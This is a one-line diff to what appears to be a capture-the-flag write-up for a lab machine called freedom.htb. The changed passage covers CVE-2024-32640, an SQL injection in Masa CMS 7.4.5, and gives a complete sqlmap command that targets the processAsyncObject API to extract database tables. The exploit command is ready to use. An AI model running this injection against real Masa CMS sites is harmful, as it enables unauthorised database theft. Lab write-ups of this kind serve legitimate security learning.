@@ -40,7 +40,7 @@ The version running is **"Masa CMS 7.4.5"**, now equipped with this information,
 ### SQL Injection
 I discovered that there was a recent [SQL Injection](https://projectdiscovery.io/blog/hacking-apple-with-sql-injection) vulnerability found in **Masa CMS** marked as **CVE-2024-32640** with a [Proof-of-Concept](https://www.pizzapower.me/2024/11/13/mura-masa-cms-sql-injection-cve-2024-32640/) Python script freely available.
 
-Instead of using this PoC, I decided to just use **sqlmap** and quickly threw together a command to use:\
+Instead of using this PoC, I decided to just use **sqlmap** and quickly threw together a command to use:
 ```
 sqlmap -u "http://freedom.htb/index.cfm/_api/json/v1/default/?method=processAsyncObject" --data "object=displayregion&contenthistid=x%5C'*--+Arrv&previewid=1" --level 3 --risk 2 --method POST --dbms=mysql --timeout=10 --technique=T --batch -D dbMasaCMS -T <table> -C <column/s>
 ```
